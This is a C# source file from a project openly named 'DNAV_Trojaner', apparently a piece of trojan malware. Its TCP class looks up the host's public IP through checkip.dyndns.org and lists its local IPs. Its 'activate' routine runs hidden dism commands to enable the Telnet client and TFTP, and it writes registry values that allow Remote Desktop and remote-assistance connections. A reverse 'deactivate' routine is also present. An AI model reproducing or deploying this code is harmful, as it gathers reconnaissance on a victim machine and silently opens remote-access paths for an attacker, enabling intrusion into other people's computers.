using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

namespace DNAV_Trojaner
{
    class TCP
    {
        static public string getPublicIP()
        {
            //https://stackoverflow.com/questions/1069103/how-to-get-the-ip-address-of-the-server-on-which-my-c-sharp-application-is-runni
            string direction;
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            WebResponse response = request.GetResponse();
            StreamReader stream = new StreamReader(response.GetResponseStream());
            direction = stream.ReadToEnd();
            stream.Close();
            response.Close();
            int first = direction.IndexOf("Address: ") + 9;
            int last = direction.LastIndexOf("</body>");
            direction = direction.Substring(first, last - first);
            return direction;
        }

        static public List<string> getLocalIPs()
        {
            //https://stackoverflow.com/questions/1069103/how-to-get-the-ip-address-of-the-server-on-which-my-c-sharp-application-is-runni
            IPHostEntry host;
            List<string> localIPs = new List<string>();
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {    
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIPs.Add(ip.ToString());
                }
            }
            return localIPs;
        }

         static public string getLocalIPList(){
              List<string> localIPs = getLocalIPs();
              string tmp = "";
              foreach (string localIP in localIPs)
              {
                  tmp += localIP+"\n";
              }              
              return tmp;
         }
        
        static public void deactivate(){
            ExecuteCommand("dism /online /Disable-Feature /FeatureName:TelnetClient");
            ExecuteCommand("dism /online /Disable-Feature /FeatureName:TFTP");
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
            key.SetValue("fDenyTSConnections", "1");
            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
            key.SetValue("fAllowToGetHelp", "0");
            key.Close();
        }

        static public void activate(){
            ExecuteCommand("dism /online /Enable-Feature /FeatureName:TelnetClient");
            ExecuteCommand("dism /online /Enable-Feature /FeatureName:TFTP");
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
            key.SetValue("fDenyTSConnections", "0");
            key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server");
            key.SetValue("fAllowToGetHelp", "1");
            key.Close();
        }

        static void ExecuteCommand(string command)
        {
            int exitCode;
            ProcessStartInfo processInfo;
            Process process;
            processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            };
            process = Process.Start(processInfo);
            process.WaitForExit();
            process.Close();
        }
    }
}
